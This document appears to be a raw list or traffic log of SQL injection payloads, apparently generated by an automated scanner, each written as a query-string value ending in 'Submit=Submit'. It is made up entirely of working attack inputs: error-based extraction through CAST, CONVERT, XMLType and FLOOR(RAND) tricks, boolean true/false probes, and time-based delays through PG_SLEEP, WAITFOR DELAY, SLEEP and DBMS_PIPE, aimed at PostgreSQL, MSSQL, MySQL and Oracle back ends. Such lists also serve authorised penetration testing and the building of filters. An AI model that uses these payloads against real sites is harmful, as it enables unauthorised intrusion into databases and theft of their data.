+1" AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND "bLEN" LIKE "bLEN&Submit=Submit
+1%') AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ('%'='&Submit=Submit
+1%')) AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (('%'='&Submit=Submit
+1%' AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND '%'='&Submit=Submit
+1%" AND 6044=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6044=6044) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND "%"="&Submit=Submit
+1) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))-- bRZd&Submit=Submit
+1) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (1527=1527&Submit=Submit
+1)) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ((8017=8017&Submit=Submit
+1))) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (((5462=5462&Submit=Submit
+1 AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))&Submit=Submit
+1 AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))-- VNsg&Submit=Submit
+1 AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))# jKQw&Submit=Submit
+1' AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))-- qpEz&Submit=Submit
+1') AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ('lJHq'='lJHq&Submit=Submit
+1')) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (('mYTX'='mYTX&Submit=Submit
+1'))) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ((('uJRZ'='uJRZ&Submit=Submit
+1' AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND 'gsGj'='gsGj&Submit=Submit
+1') AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ('kCrC' LIKE 'kCrC&Submit=Submit
+1')) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (('wRSK' LIKE 'wRSK&Submit=Submit
+1' AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND 'eXjr' LIKE 'eXjr&Submit=Submit
+1") AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ("DmaK"="DmaK&Submit=Submit
+1")) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (("lxod"="lxod&Submit=Submit
+1" AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND "myfC"="myfC&Submit=Submit
+1") AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ("iGog" LIKE "iGog&Submit=Submit
+1" AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND "IYmV" LIKE "IYmV&Submit=Submit
+1%') AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ('%'='&Submit=Submit
+1%')) AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (('%'='&Submit=Submit
+1%' AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND '%'='&Submit=Submit
+1%" AND 3655 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3655=3655) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND "%"="&Submit=Submit
+1) AND 5443=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5443=5443) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))-- jBkz&Submit=Submit
+1) AND 5443=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5443=5443) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (8411=8411&Submit=Submit
+1)) AND 5443=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5443=5443) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND ((9891=9891&Submit=Submit
+1))) AND 5443=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5443=5443) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113))) AND (((8172=8172&Submit=Submit
+1 AND 5443=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5443=5443) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))&Submit=Submit
+1 AND 5443=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5443=5443) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))-- PpPy&Submit=Submit
+1 AND 5443=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5443=5443) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(107)+CHAR(113)))# mEdr&Submit=Submit
+1&Submit=Submit
+1&Submit=Submit
+1,(")(,,))'&Submit=Submit
+1'JqugmO<'">JVdYzz&Submit=Submit
+1) AND 5945=2487 AND (9023=9023&Submit=Submit
+1) AND 1723=1723 AND (4959=4959&Submit=Submit
+1) AND 7357=2989 AND (3768=3768&Submit=Submit
+1 AND 6363=1521&Submit=Submit
+1 AND 1723=1723&Submit=Submit
+1 AND 9677=7215&Submit=Submit
+1 AND 9598=1151-- ypMo&Submit=Submit
+1 AND 1723=1723-- BuXM&Submit=Submit
+1 AND 9828=6822-- MNbj&Submit=Submit
+1') AND 3814=6594 AND ('LPdG'='LPdG&Submit=Submit
+1') AND 1723=1723 AND ('MZkj'='MZkj&Submit=Submit
+1') AND 2980=8149 AND ('PMCt'='PMCt&Submit=Submit
+1' AND 1587=5132 AND 'AeBQ'='AeBQ&Submit=Submit
+1' AND 1723=1723 AND 'MDTN'='MDTN&Submit=Submit
+1' AND 7814=4488 AND 'wNJp'='wNJp&Submit=Submit
+1%' AND 9383=2642 AND '%'='&Submit=Submit
+1%' AND 1723=1723 AND '%'='&Submit=Submit
+1%' AND 3374=4117 AND '%'='&Submit=Submit
+(SELECT (CASE WHEN (9835=3532) THEN 9835 ELSE 9835*(SELECT 9835 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+(SELECT (CASE WHEN (4617=4617) THEN 4617 ELSE 4617*(SELECT 4617 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+(SELECT (CASE WHEN (1501=8275) THEN 1501 ELSE 1501*(SELECT 1501 FROM INFORMATION_SCHEMA.PLUGINS) END))&Submit=Submit
+1) AND (SELECT 9680 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(9680=9680,1))),0x716b6a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (8809=8809&Submit=Submit
+1 AND (SELECT 9680 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(9680=9680,1))),0x716b6a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&Submit=Submit
+1 AND (SELECT 9680 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(9680=9680,1))),0x716b6a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KnyT&Submit=Submit
+1') AND (SELECT 9680 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(9680=9680,1))),0x716b6a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('rtjf'='rtjf&Submit=Submit
+1' AND (SELECT 9680 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(9680=9680,1))),0x716b6a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'pcbp'='pcbp&Submit=Submit
+1%' AND (SELECT 9680 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(9680=9680,1))),0x716b6a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='&Submit=Submit
+1) AND 8162=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8162=8162) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)) AS NUMERIC) AND (1106=1106&Submit=Submit
+1 AND 8162=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8162=8162) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)) AS NUMERIC)&Submit=Submit
+1 AND 8162=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8162=8162) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)) AS NUMERIC)-- iNRK&Submit=Submit
+1') AND 8162=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8162=8162) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)) AS NUMERIC) AND ('xxUc'='xxUc&Submit=Submit
+1' AND 8162=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8162=8162) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)) AS NUMERIC) AND 'gaQt'='gaQt&Submit=Submit
+1%' AND 8162=CAST((CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8162=8162) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)) AS NUMERIC) AND '%'='&Submit=Submit
+1) AND 3409 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3409=3409) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(106)+CHAR(113))) AND (1019=1019&Submit=Submit
+1 AND 3409 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3409=3409) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(106)+CHAR(113)))&Submit=Submit
+1 AND 3409 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3409=3409) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(106)+CHAR(113)))-- UcQk&Submit=Submit
+1') AND 3409 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3409=3409) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(106)+CHAR(113))) AND ('lZfj'='lZfj&Submit=Submit
+1' AND 3409 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3409=3409) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(106)+CHAR(113))) AND 'oTNW'='oTNW&Submit=Submit
+1%' AND 3409 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3409=3409) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(106)+CHAR(113))) AND '%'='&Submit=Submit
+1) AND 3470=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (3470=3470) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (4551=4551&Submit=Submit
+1 AND 3470=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (3470=3470) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)&Submit=Submit
+1 AND 3470=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (3470=3470) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- kalT&Submit=Submit
+1') AND 3470=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (3470=3470) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('yNct'='yNct&Submit=Submit
+1' AND 3470=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (3470=3470) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'heIk'='heIk&Submit=Submit
+1%' AND 3470=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (3470=3470) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&Submit=Submit
+(SELECT 3663 FROM(SELECT COUNT(*),CONCAT(0x716b7a7671,(SELECT (ELT(3663=3663,1))),0x716b6a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&Submit=Submit
+(SELECT CONCAT(0x716b7a7671,(SELECT (ELT(8768=8768,1))),0x716b6a6a71))&Submit=Submit
+(SELECT (CHR(113)||CHR(107)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (2659=2659) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(106)||CHR(113)))&Submit=Submit
+(SELECT CHAR(113)+CHAR(107)+CHAR(122)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6323=6323) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(106)+CHAR(113))&Submit=Submit
+1);SELECT PG_SLEEP(5)--&Submit=Submit
+1;SELECT PG_SLEEP(5)--&Submit=Submit
+1');SELECT PG_SLEEP(5)--&Submit=Submit
+1';SELECT PG_SLEEP(5)--&Submit=Submit
+1%';SELECT PG_SLEEP(5)--&Submit=Submit
+1);WAITFOR DELAY '0:0:5'--&Submit=Submit
+1;WAITFOR DELAY '0:0:5'--&Submit=Submit
+1');WAITFOR DELAY '0:0:5'--&Submit=Submit
+1';WAITFOR DELAY '0:0:5'--&Submit=Submit
+1%';WAITFOR DELAY '0:0:5'--&Submit=Submit
+1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(102)||CHR(73)||CHR(82),5) FROM DUAL--&Submit=Submit
+1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(102)||CHR(73)||CHR(82),5) FROM DUAL--&Submit=Submit
+1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(102)||CHR(73)||CHR(82),5) FROM DUAL--&Submit=Submit
+1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(102)||CHR(73)||CHR(82),5) FROM DUAL--&Submit=Submit
+1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(102)||CHR(73)||CHR(82),5) FROM DUAL--&Submit=Submit
+1) AND SLEEP(5) AND (9114=9114&Submit=Submit
+1 AND SLEEP(5)&Submit=Submit
+1 AND SLEEP(5)-- cSqj&Submit=Submit
+1') AND SLEEP(5) AND ('YsQb'='YsQb&Submit=Submit
+1' AND SLEEP(5) AND 'LAye'='LAye&Submit=Submit
+1%' AND SLEEP(5) AND '%'='&Submit=Submit
+1) AND 1963=(SELECT 1963 FROM PG_SLEEP(5)) AND (6588=6588&Submit=Submit
+1 AND 1963=(SELECT 1963 FROM PG_SLEEP(5))&Submit=Submit
+1 AND 1963=(SELECT 1963 FROM PG_SLEEP(5))-- aBea&Submit=Submit
+1') AND 1963=(SELECT 1963 FROM PG_SLEEP(5)) AND ('ruKy'='ruKy&Submit=Submit
+1' AND 1963=(SELECT 1963 FROM PG_SLEEP(5)) AND 'xcmj'='xcmj&Submit=Submit
+1%' AND 1963=(SELECT 1963 FROM PG_SLEEP(5)) AND '%'='&Submit=Submit
+1) WAITFOR DELAY '0:0:5' AND (6950=6950&Submit=Submit
+1 WAITFOR DELAY '0:0:5'&Submit=Submit
+1 WAITFOR DELAY '0:0:5'-- TUvk&Submit=Submit
+1') WAITFOR DELAY '0:0:5' AND ('dloF'='dloF&Submit=Submit
+1' WAITFOR DELAY '0:0:5' AND 'VvCz'='VvCz&Submit=Submit
+1%' WAITFOR DELAY '0:0:5' AND '%'='&Submit=Submit
